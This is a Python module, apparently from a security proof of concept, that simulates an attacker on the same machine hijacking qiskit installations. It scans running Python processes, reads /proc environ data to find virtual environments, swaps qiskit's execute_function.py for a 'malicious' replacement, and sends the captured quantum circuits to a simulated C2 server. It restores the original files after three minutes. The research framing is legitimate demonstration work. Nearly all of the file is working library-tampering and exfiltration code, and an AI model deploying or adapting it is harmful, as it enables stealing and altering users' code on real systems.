"""
Simulate an attacker patching the qiskit python libraries to inser its own code.

In this module we have code responsible for simulating an attacker behavior
which may be running in the same machine as the user does. It will look for
locations where quantum-related libraries, namely qiskit ones are installed,
and tries to replace some files with its known ones in order to detour and take control
of the user circuits. 
"""

import psutil
import os
import time
import copy
import shutil


class PythonPackagePatcher:
    """A base class to handle the common logic for simulating the patching of python libraries."""

    def __init__(self, connection, dir_circuits):
        """
        Initialize the PythonPackagePatcher instance.

        This class is responsible for patching qiskit-related libraries. Requires
        the script to have the same privileges as the user does, as these libraries
        are usually installed in a virtual environment. We're basically looking for all
        environments found on the current machine, and replace execute_function.py with
        our own. This will be used to simulate the "stealing" of the circuits, and also
        to alter the functionality of the ones sent to the cloud. As we are good citizens,
        when this scripts finishes, it restores the patched libraries.

        Parameters
        ----------
        connection : communication.C2Communication
            Represents an active communication to the "c2" simulated server.
        dir_circuits : str
            Represents a location where the "stolen" circuits will be saved. This location
            is the same as the one from execute_function.py that we drop.
        """
        self._m_data = list()
        self._connection = connection
        self._dir_circuits = dir_circuits

    def _running_processes(self):
        """
        Find all running python processes.

        On Windows we don't have a very good deterministic way of finding the location of the
        virtual environments, so what we do is periodically call this function to grab running processes.
        After we have the python processes running, we can easily determine their start directory.

        Returns
        -------
        A list of python pids that are currently running on the system.
        """
        python_pids = []
        for p in psutil.process_iter():
            if "python" not in p.name().lower():
                continue
            python_pids.append(p.pid)
        return python_pids

    def _processes_data(self, running_processes):
        """
        Patch qiskit locations based on python running_processes.

        Is different based on platform. So this is not implemented
        in the base class.

        Parameters
        ----------
        running_processes : list
            A list of python pids that are currently running on the system.
            Retrieved with _running_processes().

        Returns
        -------
        None
        """
        print("[!] Not implemented - {}".format(running_processes))

    def _site_package(self, path):
        """
        Gather the location of qiskit based on the process path.

        We basically need to find all qiskit locations.
        So we'll start from the python process path and construct all potential locations
        where this may be found.

        Parameters
        ----------
        path : str
            The path of a python running process.

        Returns
        -------
        A list of potential qiskit locations that can be patched.
        """
        while not os.path.exists(os.path.join(path, "lib")):
            path = os.path.dirname(path)
        out = [os.path.join(path, "lib", "site-packages", "qiskit")]

        path = os.path.join(path, "lib")
        for d in os.listdir(path):
            out.append(os.path.join(path, d, "site-packages", "qiskit"))

        return out

    def _report_circuits(self):
        """
        Report cirucits to c2 simulated connection.

        Watches the _dir_circuits. This is where the execute function will drop the
        circuits when the user attempts to run them. We're sending the content
        of that directory to the c2 connection.

        Returns
        -------
        None
        """
        if not os.path.isdir(self._dir_circuits):
            return

        to_remove = list()
        for f_name in os.listdir(self._dir_circuits):
            f_path = os.path.join(self._dir_circuits, f_name)
            with open(f_path, "r", encoding="utf8") as f:
                content = f.read()
            self._connection.send("/circuit", {"circuit": content})
            to_remove.append(f_path)

        for f_path in to_remove:
            os.unlink(f_path)

    def restore_state(self):
        """
        Restore the qiskit package to the original state.

        We are good citizens, and don't want to leave the system in an inconsistent state.
        So we undo whatever we did.

        Returns
        -------
        None
        """
        data = copy.deepcopy(self._m_data)
        for d in data:
            self._remove_patch(d)

    def _add_patch(self, path):
        """
        Patch a given python directory.

        Starting from a python directory, we gather data about potential qiskit locations.
        Then we attempt to modify all such locations. We do this only once as we store
        the python paths that we successfully modified in _m_data attribute.

        Parameters
        ----------
        path : str
            The path of a python running process.

        Returns
        -------
        None
        """
        if path in self._m_data:
            return
        self._m_data.append(path)

        paths = self._site_package(path)
        for p in paths:
            self._patch_qiskit(qiskit_location=p, restore=False)

    def _remove_patch(self, path):
        """
        Remove a patch from a given python directory.

        Starting from a python directory, we gather data about potential qiskit locations.
        Then we attempt to undo all modifications to such locations.

        Parameters
        ----------
        path : str
            The path of a python running process.

        Returns
        -------
        None
        """
        if path not in self._m_data:
            return
        self._m_data.remove(path)

        paths = self._site_package(path)
        for p in paths:
            self._patch_qiskit(qiskit_location=p, restore=True)

    def _patch_qiskit(self, qiskit_location, restore):
        """
        Patch a qiskit library with our own controlled code.

        Replaces execute_function.py with our own.

        Parameters
        ----------
        qiskit_location : str
            The path where a potential qiskit library may be installed on the system.
        restore : boolean
            If true, we want to unpatch, otherwise we want to replace with our
            own "malicious" python file.

        Returns
        -------
        None
        """
        original_location = os.path.join(qiskit_location, "execute_function.py")
        bkp_location = os.path.join(qiskit_location, "execute_function.py.org")
        payload = os.path.join(os.getcwd(), r"execute_function.py")

        # No qiskit
        if not os.path.isfile(original_location):
            return

        # Already patched - check if we need to restore
        if os.path.isfile(bkp_location):
            if restore:
                print("[*] Restoring patched qiskit: {}".format(bkp_location))
                os.unlink(original_location)
                os.rename(bkp_location, original_location)
            return

        print("[*] Found unpatched qiskit: {}".format(original_location))

        try:
            os.rename(original_location, bkp_location)
            print("[*] Created backup {}".format(bkp_location))

            shutil.copy(payload, original_location)
            print("[*] Replaced with malicious one {}".format(payload))
        except Exception as ex:
            print("[!] Failed to patch {}".format(ex))

    def run(self):
        """
        Start the replacement of the qiksit files.

        Runs for 3 minutes (for the PoC this suffice).
        After this is done, we restore the state and
        start cleaning our mess.

        Returns
        -------
        None
        """
        for _ in range(180):
            running_processes = self._running_processes()
            self._processes_data(running_processes)
            self._report_circuits()
            time.sleep(1)


class LinuxPatcher(PythonPackagePatcher):
    """A linux specific class to handle the specific logic for simulating the patching of python libraries."""

    def __init__(self, connection, dir_circuits):
        """
        Initialize the LinuxPatcher instance.

        Parameters
        ----------
        connection : communication.C2Communication
            Represents an active communication to the "c2" simulated server.
        dir_circuits : str
            Represents a location where the "stolen" circuits will be saved. This location
            is the same as the one from execute_function.py that we drop.
        """
        super().__init__(connection, dir_circuits)

    def _processes_data(self, running_processes):
        """
        Find the virtual environment of python running processes.

        On linux we need to open /proc/<pid>/environ to find the location
        of the python virtual environment. We then proceed to patch it.

        Parameters
        ----------
        running_processes : list
            A list of python pids that are currently running on the system.
            Retrieved with _running_processes().

        Returns
        -------
        None
        """
        for pid in running_processes:
            try:
                f = open("/proc/%d/environ" % (pid), "r")
                print("[*] Read environ for pid %d" % (pid))
                environ = f.read()
                f.close()

                environ = environ.split("\0")
                for e in environ:
                    if e.startswith("VIRTUAL_ENV"):
                        var = e[len("VIRTUAL_ENV="):]
                        self._add_patch(var)
                        break
                    if e.startswith("PATH="):
                        var = e[len("PATH="):].split(":")[0]
                        var = os.path.dirname(var)
                        self._add_patch(var)
            except OSError:
                print("[-] Cannot open environ for pid %d" % (pid))


class WindowsPatcher(PythonPackagePatcher):
    """A windows specific class to handle the specific logic for simulating the patching of python libraries."""

    def __init__(self, connection, dir_circuits):
        """
        Initialize the WindowsPatcher instance.

        Parameters
        ----------
        connection : communication.C2Communication
            Represents an active communication to the "c2" simulated server.
        dir_circuits : str
            Represents a location where the "stolen" circuits will be saved. This location
            is the same as the one from execute_function.py that we drop.
        """
        super().__init__(connection, dir_circuits)

    def _processes_data(self, running_processes):
        """
        Find the virtual environment of python running processes.

        On windows we can iterate all processes and simply look for its start directory.

        Parameters
        ----------
        running_processes : list
            A list of python pids that are currently running on the system.
            Retrieved with _running_processes().

        Returns
        -------
        None
        """
        for pid in running_processes:
            python_path = psutil.Process(pid).cmdline()[0]
            self._add_patch(python_path)
